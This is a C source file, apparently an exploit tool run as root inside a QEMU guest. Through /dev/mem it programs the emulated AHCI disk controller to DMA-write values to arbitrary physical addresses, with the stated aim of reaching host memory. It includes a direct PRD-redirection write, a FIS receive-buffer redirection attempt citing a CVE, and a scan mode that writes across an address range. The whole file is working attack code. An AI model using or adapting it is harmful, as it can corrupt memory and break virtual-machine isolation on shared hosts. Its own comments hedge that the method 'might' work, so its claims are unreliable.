/*
 * AHCI Host Memory Write via DMA
 * 
 * Theory: AHCI DMA operations go through QEMU's address translation.
 * In some configurations, QEMU might allow DMA to addresses outside
 * the normal guest RAM range, especially if IOMMU is not enabled.
 *
 * The attack: Craft AHCI commands with PRD entries pointing to
 * physical addresses in the host's memory space.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <linux/fs.h>

#define AHCI_BASE 0xfea0e000
#define AHCI_SIZE 0x1000

/* AHCI Registers */
#define AHCI_CAP        0x00
#define AHCI_GHC        0x04
#define AHCI_IS         0x08
#define AHCI_PI         0x0C
#define AHCI_VS         0x10

/* Port registers (offset from port base) */
#define PORT_CLB        0x00
#define PORT_CLB_HI     0x04
#define PORT_FB         0x08
#define PORT_FB_HI      0x0C
#define PORT_IS         0x10
#define PORT_IE         0x14
#define PORT_CMD        0x18
#define PORT_TFD        0x20
#define PORT_SIG        0x24
#define PORT_SSTS       0x28
#define PORT_SCTL       0x2C
#define PORT_SERR       0x30
#define PORT_SACT       0x34
#define PORT_CI         0x38

#define AHCI_PORT_BASE(p) (0x100 + (p) * 0x80)

#define PORT_CMD_ST     (1 << 0)
#define PORT_CMD_FRE    (1 << 4)
#define PORT_CMD_FR     (1 << 14)
#define PORT_CMD_CR     (1 << 15)

/* FIS types */
#define FIS_TYPE_REG_H2D    0x27
#define FIS_TYPE_REG_D2H    0x34

/* ATA commands */
#define ATA_CMD_IDENTIFY    0xEC
#define ATA_CMD_READ_DMA    0xC8
#define ATA_CMD_WRITE_DMA   0xCA
#define ATA_CMD_READ_DMA_EXT  0x25
#define ATA_CMD_WRITE_DMA_EXT 0x35

/* Command header */
struct ahci_cmd_hdr {
    uint16_t opts;
    uint16_t prdtl;
    uint32_t prdbc;
    uint32_t ctba;
    uint32_t ctba_hi;
    uint32_t reserved[4];
} __attribute__((packed));

/* PRD entry */
struct ahci_prdt_entry {
    uint32_t dba;
    uint32_t dba_hi;
    uint32_t reserved;
    uint32_t dbc;  /* bit 31 = interrupt, bits 21:0 = byte count - 1 */
} __attribute__((packed));

/* Command table */
struct ahci_cmd_tbl {
    uint8_t cfis[64];
    uint8_t acmd[16];
    uint8_t reserved[48];
    struct ahci_prdt_entry prdt[8];
} __attribute__((packed));

/* Received FIS */
struct ahci_recv_fis {
    uint8_t dsfis[28];
    uint8_t reserved1[4];
    uint8_t psfis[20];
    uint8_t reserved2[12];
    uint8_t rfis[20];
    uint8_t reserved3[4];
    uint8_t sdbfis[8];
    uint8_t ufis[64];
    uint8_t reserved4[96];
} __attribute__((packed));

static volatile void *ahci_mmio = NULL;
static int mem_fd = -1;
static int pagemap_fd = -1;

/* DMA buffers - aligned and pinned */
static struct ahci_cmd_hdr *cmd_list = NULL;
static struct ahci_recv_fis *recv_fis = NULL;
static struct ahci_cmd_tbl *cmd_table = NULL;
static uint8_t *data_buffer = NULL;

static uint64_t cmd_list_phys = 0;
static uint64_t recv_fis_phys = 0;
static uint64_t cmd_table_phys = 0;
static uint64_t data_buffer_phys = 0;

/* Helper functions */
static inline uint32_t mmio_read32(uint32_t offset)
{
    return *(volatile uint32_t *)((char *)ahci_mmio + offset);
}

static inline void mmio_write32(uint32_t offset, uint32_t value)
{
    *(volatile uint32_t *)((char *)ahci_mmio + offset) = value;
}

static inline uint32_t port_read(int port, uint32_t reg)
{
    return mmio_read32(AHCI_PORT_BASE(port) + reg);
}

static inline void port_write(int port, uint32_t reg, uint32_t value)
{
    mmio_write32(AHCI_PORT_BASE(port) + reg, value);
}

/* Get physical address from virtual */
static uint64_t virt_to_phys(void *virt)
{
    uint64_t value;
    off_t offset = ((uintptr_t)virt / 4096) * 8;
    
    if (pread(pagemap_fd, &value, 8, offset) != 8) {
        perror("pread pagemap");
        return 0;
    }
    
    if (!(value & (1ULL << 63))) {
        fprintf(stderr, "Page not present for %p\n", virt);
        return 0;
    }
    
    uint64_t pfn = value & ((1ULL << 55) - 1);
    return (pfn * 4096) + ((uintptr_t)virt % 4096);
}

/* Allocate DMA memory */
static void *alloc_dma_buffer(size_t size, size_t align, uint64_t *phys)
{
    void *buf;
    
    if (posix_memalign(&buf, align, size) != 0) {
        perror("posix_memalign");
        return NULL;
    }
    
    memset(buf, 0, size);
    
    /* Lock in memory */
    if (mlock(buf, size) != 0) {
        perror("mlock");
        free(buf);
        return NULL;
    }
    
    /* Touch all pages */
    volatile char *p = buf;
    for (size_t i = 0; i < size; i += 4096) {
        p[i] = 0;
    }
    
    *phys = virt_to_phys(buf);
    if (*phys == 0) {
        munlock(buf, size);
        free(buf);
        return NULL;
    }
    
    return buf;
}

/* Initialize AHCI */
static int ahci_init(void)
{
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd < 0) {
        perror("open /dev/mem");
        return -1;
    }
    
    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0) {
        perror("open pagemap");
        return -1;
    }
    
    ahci_mmio = mmap(NULL, AHCI_SIZE, PROT_READ | PROT_WRITE, 
                     MAP_SHARED, mem_fd, AHCI_BASE);
    if (ahci_mmio == MAP_FAILED) {
        perror("mmap AHCI");
        return -1;
    }
    
    printf("[+] AHCI MMIO mapped at %p\n", ahci_mmio);
    
    /* Allocate DMA buffers */
    cmd_list = alloc_dma_buffer(1024, 1024, &cmd_list_phys);
    if (!cmd_list) return -1;
    printf("[+] Command list: virt=%p phys=0x%lx\n", cmd_list, cmd_list_phys);
    
    recv_fis = alloc_dma_buffer(256, 256, &recv_fis_phys);
    if (!recv_fis) return -1;
    printf("[+] Recv FIS: virt=%p phys=0x%lx\n", recv_fis, recv_fis_phys);
    
    cmd_table = alloc_dma_buffer(sizeof(struct ahci_cmd_tbl), 128, &cmd_table_phys);
    if (!cmd_table) return -1;
    printf("[+] Cmd table: virt=%p phys=0x%lx\n", cmd_table, cmd_table_phys);
    
    data_buffer = alloc_dma_buffer(4096, 4096, &data_buffer_phys);
    if (!data_buffer) return -1;
    printf("[+] Data buffer: virt=%p phys=0x%lx\n", data_buffer, data_buffer_phys);
    
    return 0;
}

/* Print AHCI info */
static void ahci_info(void)
{
    uint32_t cap = mmio_read32(AHCI_CAP);
    uint32_t ghc = mmio_read32(AHCI_GHC);
    uint32_t pi = mmio_read32(AHCI_PI);
    uint32_t vs = mmio_read32(AHCI_VS);
    
    printf("\n=== AHCI Info ===\n");
    printf("Version: %d.%d.%d\n", (vs >> 16) & 0xff, (vs >> 8) & 0xff, vs & 0xff);
    printf("Capabilities: 0x%08x\n", cap);
    printf("  Ports: %d\n", (cap & 0x1f) + 1);
    printf("  Cmd slots: %d\n", ((cap >> 8) & 0x1f) + 1);
    printf("  64-bit: %s\n", (cap & (1 << 31)) ? "yes" : "no");
    printf("Global HBA Control: 0x%08x\n", ghc);
    printf("Ports Implemented: 0x%08x\n", pi);
    
    for (int i = 0; i < 6; i++) {
        if (!(pi & (1 << i))) continue;
        
        uint32_t ssts = port_read(i, PORT_SSTS);
        uint32_t cmd = port_read(i, PORT_CMD);
        uint32_t sig = port_read(i, PORT_SIG);
        uint32_t tfd = port_read(i, PORT_TFD);
        
        printf("\nPort %d:\n", i);
        printf("  SSTS: 0x%08x (DET=%d IPM=%d)\n", ssts, ssts & 0xf, (ssts >> 8) & 0xf);
        printf("  CMD:  0x%08x\n", cmd);
        printf("  SIG:  0x%08x\n", sig);
        printf("  TFD:  0x%08x\n", tfd);
        
        if ((ssts & 0xf) == 3) {
            printf("  -> Device present!\n");
        }
    }
}

/* Stop a port */
static void port_stop(int port)
{
    uint32_t cmd = port_read(port, PORT_CMD);
    
    if (!(cmd & (PORT_CMD_ST | PORT_CMD_CR | PORT_CMD_FRE | PORT_CMD_FR))) {
        return;  /* Already stopped */
    }
    
    /* Clear ST */
    cmd &= ~PORT_CMD_ST;
    port_write(port, PORT_CMD, cmd);
    
    /* Wait for CR to clear */
    for (int i = 0; i < 500; i++) {
        if (!(port_read(port, PORT_CMD) & PORT_CMD_CR)) break;
        usleep(1000);
    }
    
    /* Clear FRE */
    cmd = port_read(port, PORT_CMD);
    cmd &= ~PORT_CMD_FRE;
    port_write(port, PORT_CMD, cmd);
    
    /* Wait for FR to clear */
    for (int i = 0; i < 500; i++) {
        if (!(port_read(port, PORT_CMD) & PORT_CMD_FR)) break;
        usleep(1000);
    }
}

/* Start a port */
static void port_start(int port)
{
    /* Set addresses */
    port_write(port, PORT_CLB, cmd_list_phys & 0xffffffff);
    port_write(port, PORT_CLB_HI, cmd_list_phys >> 32);
    port_write(port, PORT_FB, recv_fis_phys & 0xffffffff);
    port_write(port, PORT_FB_HI, recv_fis_phys >> 32);
    
    /* Clear interrupts */
    port_write(port, PORT_IS, port_read(port, PORT_IS));
    port_write(port, PORT_SERR, port_read(port, PORT_SERR));
    
    /* Start FRE */
    uint32_t cmd = port_read(port, PORT_CMD);
    cmd |= PORT_CMD_FRE;
    port_write(port, PORT_CMD, cmd);
    
    usleep(10000);
    
    /* Start ST */
    cmd = port_read(port, PORT_CMD);
    cmd |= PORT_CMD_ST;
    port_write(port, PORT_CMD, cmd);
}

/* Build H2D FIS for a command */
static void build_fis_h2d(uint8_t *fis, uint8_t command, uint64_t lba, uint16_t count)
{
    memset(fis, 0, 20);
    fis[0] = FIS_TYPE_REG_H2D;
    fis[1] = 0x80;  /* C bit = 1 (command) */
    fis[2] = command;
    fis[3] = 0;     /* features */
    fis[4] = lba & 0xff;
    fis[5] = (lba >> 8) & 0xff;
    fis[6] = (lba >> 16) & 0xff;
    fis[7] = 0x40;  /* device = LBA mode */
    fis[8] = (lba >> 24) & 0xff;
    fis[9] = (lba >> 32) & 0xff;
    fis[10] = (lba >> 40) & 0xff;
    fis[12] = count & 0xff;
    fis[13] = (count >> 8) & 0xff;
}

/* Issue command and wait for completion */
static int issue_cmd(int port, int slot)
{
    port_write(port, PORT_CI, 1 << slot);
    
    for (int i = 0; i < 5000; i++) {
        uint32_t ci = port_read(port, PORT_CI);
        if (!(ci & (1 << slot))) {
            /* Check for errors */
            uint32_t tfd = port_read(port, PORT_TFD);
            if (tfd & 0x01) {
                printf("[-] Command error: TFD=0x%x\n", tfd);
                return -1;
            }
            return 0;
        }
        usleep(1000);
    }
    
    printf("[-] Command timeout\n");
    return -1;
}

/*
 * Attempt DMA write to arbitrary physical address
 * 
 * This exploits the fact that QEMU's AHCI DMA engine uses
 * the guest physical addresses directly. If IOMMU is not
 * properly configured, we might be able to write outside
 * the guest RAM region.
 */
static int try_dma_write(int port, uint64_t target_phys, uint8_t *data, size_t len)
{
    printf("[*] Attempting DMA write to phys 0x%lx (%zu bytes)\n", target_phys, len);
    
    /* Setup command header */
    memset(&cmd_list[0], 0, sizeof(struct ahci_cmd_hdr));
    cmd_list[0].opts = (5 << 0) |   /* CFL = 5 DWORDs */
                       (1 << 6);     /* W = 1 (write) */
    cmd_list[0].prdtl = 1;
    cmd_list[0].ctba = cmd_table_phys & 0xffffffff;
    cmd_list[0].ctba_hi = cmd_table_phys >> 32;
    
    /* Setup command table */
    memset(cmd_table, 0, sizeof(struct ahci_cmd_tbl));
    build_fis_h2d(cmd_table->cfis, ATA_CMD_WRITE_DMA_EXT, 0, 1);
    
    /* 
     * KEY EXPLOIT: Point PRD directly at target physical address
     * This should cause QEMU to DMA to that address
     */
    cmd_table->prdt[0].dba = target_phys & 0xffffffff;
    cmd_table->prdt[0].dba_hi = target_phys >> 32;
    cmd_table->prdt[0].dbc = (len - 1);  /* Byte count - 1 */
    
    /* Copy data to buffer just in case QEMU reads from our buffer */
    memcpy(data_buffer, data, len);
    
    /* Issue command */
    return issue_cmd(port, 0);
}

/*
 * Alternative: Use FIS receive buffer manipulation
 * 
 * CVE-2021-3947 involves the FIS receive buffer.
 * By setting FB to point near our target, received FIS
 * might overflow into the target.
 */
static int try_fis_overflow(int port, uint64_t target_phys, uint8_t *data, size_t len)
{
    printf("[*] Attempting FIS overflow to phys 0x%lx\n", target_phys);
    
    port_stop(port);
    
    /* Point FIS base near target so D2H FIS lands on target */
    /* D2H FIS is at offset 0x40 in the receive FIS structure */
    uint64_t malicious_fb = target_phys - 0x40;
    
    port_write(port, PORT_FB, malicious_fb & 0xffffffff);
    port_write(port, PORT_FB_HI, malicious_fb >> 32);
    
    /* Start FIS receive */
    uint32_t cmd = port_read(port, PORT_CMD);
    cmd |= PORT_CMD_FRE;
    port_write(port, PORT_CMD, cmd);
    
    /* Trigger a device-to-host FIS by issuing an IDENTIFY command */
    memset(&cmd_list[0], 0, sizeof(struct ahci_cmd_hdr));
    cmd_list[0].opts = 5;  /* CFL = 5 DWORDs, read */
    cmd_list[0].prdtl = 1;
    cmd_list[0].ctba = cmd_table_phys & 0xffffffff;
    cmd_list[0].ctba_hi = cmd_table_phys >> 32;
    
    memset(cmd_table, 0, sizeof(struct ahci_cmd_tbl));
    build_fis_h2d(cmd_table->cfis, ATA_CMD_IDENTIFY, 0, 1);
    
    cmd_table->prdt[0].dba = data_buffer_phys & 0xffffffff;
    cmd_table->prdt[0].dba_hi = data_buffer_phys >> 32;
    cmd_table->prdt[0].dbc = 511;  /* 512 bytes - 1 */
    
    /* Start port */
    cmd = port_read(port, PORT_CMD);
    cmd |= PORT_CMD_ST;
    port_write(port, PORT_CMD, cmd);
    
    return issue_cmd(port, 0);
}

/* Find a port with a device */
static int find_active_port(void)
{
    uint32_t pi = mmio_read32(AHCI_PI);
    
    for (int i = 0; i < 6; i++) {
        if (!(pi & (1 << i))) continue;
        
        uint32_t ssts = port_read(i, PORT_SSTS);
        if ((ssts & 0xf) == 3) {
            return i;
        }
    }
    
    return -1;
}

static void usage(const char *prog)
{
    printf("AHCI Host Memory Write Tool\n\n");
    printf("Usage: %s <command> [args]\n\n", prog);
    printf("Commands:\n");
    printf("  info                       Show AHCI info\n");
    printf("  dma <phys> <value>        Try DMA write to physical address\n");
    printf("  fis <phys>                Try FIS overflow to physical address\n");
    printf("  scan <start> <end>        Scan for accessible phys addresses\n");
    printf("\nExamples:\n");
    printf("  %s info\n", prog);
    printf("  %s dma 0x101cc7218 0x4141414141414141\n", prog);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }
    
    if (geteuid() != 0) {
        fprintf(stderr, "Need root\n");
        return 1;
    }
    
    if (ahci_init() != 0) {
        fprintf(stderr, "AHCI init failed\n");
        return 1;
    }
    
    if (strcmp(argv[1], "info") == 0) {
        ahci_info();
        
    } else if (strcmp(argv[1], "dma") == 0) {
        if (argc < 4) {
            printf("Usage: %s dma <phys_addr> <value>\n", argv[0]);
            return 1;
        }
        
        uint64_t target = strtoull(argv[2], NULL, 0);
        uint64_t value = strtoull(argv[3], NULL, 0);
        
        int port = find_active_port();
        if (port < 0) {
            fprintf(stderr, "No active port found\n");
            return 1;
        }
        printf("[+] Using port %d\n", port);
        
        port_stop(port);
        port_start(port);
        
        try_dma_write(port, target, (uint8_t *)&value, sizeof(value));
        
    } else if (strcmp(argv[1], "fis") == 0) {
        if (argc < 3) {
            printf("Usage: %s fis <phys_addr>\n", argv[0]);
            return 1;
        }
        
        uint64_t target = strtoull(argv[2], NULL, 0);
        
        int port = find_active_port();
        if (port < 0) {
            fprintf(stderr, "No active port found\n");
            return 1;
        }
        printf("[+] Using port %d\n", port);
        
        port_stop(port);
        port_start(port);
        
        try_fis_overflow(port, target, NULL, 0);
        
    } else if (strcmp(argv[1], "scan") == 0) {
        if (argc < 4) {
            printf("Usage: %s scan <start_phys> <end_phys>\n", argv[0]);
            return 1;
        }
        
        uint64_t start = strtoull(argv[2], NULL, 0);
        uint64_t end = strtoull(argv[3], NULL, 0);
        
        int port = find_active_port();
        if (port < 0) {
            fprintf(stderr, "No active port found\n");
            return 1;
        }
        printf("[+] Using port %d\n", port);
        printf("[*] Scanning 0x%lx - 0x%lx\n", start, end);
        
        port_stop(port);
        port_start(port);
        
        uint64_t test_value = 0xdeadbeefcafebabe;
        
        for (uint64_t addr = start; addr < end; addr += 4096) {
            if (try_dma_write(port, addr, (uint8_t *)&test_value, 8) == 0) {
                printf("[+] Write succeeded at 0x%lx\n", addr);
            }
        }
        
    } else {
        usage(argv[0]);
        return 1;
    }
    
    return 0;
}
